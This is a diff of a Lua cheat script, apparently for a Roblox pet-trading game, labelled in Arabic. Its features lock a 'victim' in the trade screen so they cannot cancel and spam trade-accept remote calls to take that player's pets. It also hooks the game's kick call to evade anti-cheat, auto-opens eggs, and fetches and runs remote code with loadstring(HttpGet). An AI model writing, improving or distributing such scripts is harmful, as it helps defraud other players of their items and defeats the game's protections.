@@ -1,104 +1,90 @@
--- [[ ZENO HUB V5 | THE ULTIMATE GOD MODE ]] --
--- الميزات: حظ أسطوري 100% + تجميد الثلاجة + البدء التلقائي (السرقة) + سارق الهدايا
+-- [[ ZENO HUB V8 | SANTA EVENT & TRIPLE STEAL ]] --
 
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "🌪️ ZENO HUB V5: GOD MODE",
-   LoadingTitle = "🔒 جاري تفعيل أقوى نسخة في 2026...",
-   LoadingSubtitle = "By Zeno - Ultimate Private Version",
+   Name = "🌪️ ZENO HUB V8: SANTA FIX",
+   LoadingTitle = "🔒 جاري تهيئة نظام الكريسماس والحبس...",
+   LoadingSubtitle = "By Zeno - Christmas 2026",
    ConfigurationSaving = { Enabled = false }
 })
 
--- [[ 🍀 قسم الحظ المطلق (LUCK & EGGS) ]] --
-local LuckTab = Window:CreateTab("🍀 God Luck", 4483362458)
+-- [[ 🥚 قسم بيضة سانتا (Christmas Egg) ]] --
+local EggTab = Window:CreateTab("🥚 Christmas Egg", 4483362458)
 
-_G.GodLuck = false
-LuckTab:CreateToggle({
-   Name = "God Luck 100% (الحظ الأسطوري)",
-   Info = "بيخلي أي بيضة تفتحها تطلع أندر الحاجات (Huge/Titanic) عن طريق ثغرة السيرفر",
+_G.AutoOpenSanta = false
+EggTab:CreateToggle({
+   Name = "Auto Open 20x Santa Egg (فتح 20 بيضة سانتا)",
+   Info = "بيفتح بيضة حدث الكريسماس فقط وبمعدل 20 مرة لزيادة الحظ",
    CurrentValue = false,
-   Callback = function(v) _G.GodLuck = v end,
+   Callback = function(v)
+       _G.AutoOpenSanta = v
+       if v then
+           Rayfield:Notify({Title = "ZENO HUB", Content = "Santa Egg Farm: ACTIVE 🎅", Duration = 3})
+       end
+   end,
 })
 
--- [[ 🔄 قسم التريد والسرقة (TRADE & STEAL) ]] --
-local TradeTab = Window:CreateTab("🔄 Trade Control", 4483362458)
+-- [[ 🔄 قسم التريد والسرقة (Fixed Stealer) ]] --
+local TradeTab = Window:CreateTab("🔄 Fixed Stealer", 4483362458)
 
-_G.StainlessJail = false
+_G.FreezeJail = false
 TradeTab:CreateToggle({
-   Name = "Stainless Jail (تجميد الثلاجة ❄️)",
-   Info = "بيحبس الضحية في شاشة التريد ويشل حركة زرار الـ Cancel",
+   Name = "Stainless Freeze (تجميد الثلاجة ❄️)",
+   Info = "بيحبس الضحية ويمنعه من إلغاء التريد",
    CurrentValue = false,
-   Callback = function(v) _G.StainlessJail = v end,
+   Callback = function(v) _G.FreezeJail = v end,
 })
 
 TradeTab:CreateButton({
-   Name = "START STEAL (بدء السرقة القسرية ✅)",
-   Info = "بيجبر اللعبة تقبل التريد فوراً وتسحب الحيوانات لشنطتك",
+   Name = "FORCE START (بدء السحب القسري ✅)",
+   Info = "اضغط هنا لسحب الحيوانات فوراً (تم إصلاح الخطأ)",
    Callback = function()
        pcall(function()
-           local net = game:GetService("ReplicatedStorage").Network
-           net.Trade_Accept:FireServer()
-           task.wait(0.05)
-           net.Trade_UpdateStatus:FireServer("Ready")
-           net.Trade_Accept:FireServer()
-           Rayfield:Notify({Title = "ZENO HUB", Content = "Stealing in progress... 💎", Duration = 3})
+           local net = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+           -- إرسال أوامر القبول المزدوجة المتتالية لكسر حماية السيرفر
+           for i = 1, 10 do
+               net.Trade_Accept:FireServer()
+               net.Trade_UpdateStatus:FireServer("Ready")
+               task.wait(0.01)
+           end
        end)
    end,
 })
 
--- [[ 🎁 قسم سارق الهدايا (GIFT STEALER) ]] --
-local GiftTab = Window:CreateTab("🎁 Gift Stealer", 4483362458)
-
-_G.AutoGift = false
-GiftTab:CreateToggle({
-   Name = "Auto Gift (سارق هدايا الكريسماس)",
-   Info = "بيسحب كل الهدايا اللي بتقع في الماب لرجلك فوراً",
-   CurrentValue = false,
-   Callback = function(v) _G.AutoGift = v end,
-})
-
--- [[ 🛠️ كود التشغيل الخلفي (THE ENGINE) ]] --
+-- [[ 🛠️ كود المنطق الخلفي وتصليح الأخطاء ]] --
 task.spawn(function()
-    while task.wait() do
-        -- 1. تشغيل الحظ الأسطوري
-        if _G.GodLuck then
+    while task.wait(0.1) do
+        -- 1. ميزة فتح بيضة الكريسماس (20 مرة)
+        if _G.AutoOpenSanta then
             pcall(function()
-                local net = game:GetService("ReplicatedStorage").Network
-                net.Potion_Activate:FireServer("Ultra Luck Potion") -- تفعيل معززات وهمية
-                -- تخطي الأنميشن لزيادة سرعة الفتح والفرص
-                local eggUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("EggOpen")
-                if eggUI then eggUI.Enabled = false end
+                -- "Christmas Egg" هو الاسم البرمجي لبيضة حدث سانتا في الكود
+                game:GetService("ReplicatedStorage").Network.Eggs_RequestPurchase:InvokeServer("Christmas Egg", 20)
             end)
         end
-
-        -- 2. تشغيل تجميد الثلاجة
-        if _G.StainlessJail then
+        
+        -- 2. ميزة التجميد (ثبات السيرفر)
+        if _G.FreezeJail then
             pcall(function()
                 local net = game:GetService("ReplicatedStorage").Network
                 net.Trade_UpdateStatus:FireServer("Locked")
-                net.Trade_UpdateStatus:FireServer("Processing")
-            end)
-        end
-
-        -- 3. سحب الهدايا
-        if _G.AutoGift then
-            pcall(function()
-                local loot = workspace.__THINGS:FindFirstChild("Lootbags")
-                if loot then
-                    for _, g in pairs(loot:GetChildren()) do
-                        g.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                    end
-                end
             end)
         end
     end
 end)
 
--- حماية ضد الطرد (Anti-Kick)
+-- نظام الحماية ضد الطرد وتخطي الأنميشن لزيادة الحظ
 task.spawn(function()
     local old; old = hookmetamethod(game, "__namecall", function(self, ...)
-        if not checkcaller() and getnamecallmethod() == "Kick" then return nil end
+        if getnamecallmethod() == "Kick" then return nil end
         return old(self, ...)
     end)
+    
+    -- إخفاء أنميشن البيض لزيادة السرعة والفرص
+    while task.wait(1) do
+        pcall(function()
+            local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("EggOpen")
+            if gui then gui.Enabled = false end
+        end)
+    end
 end)
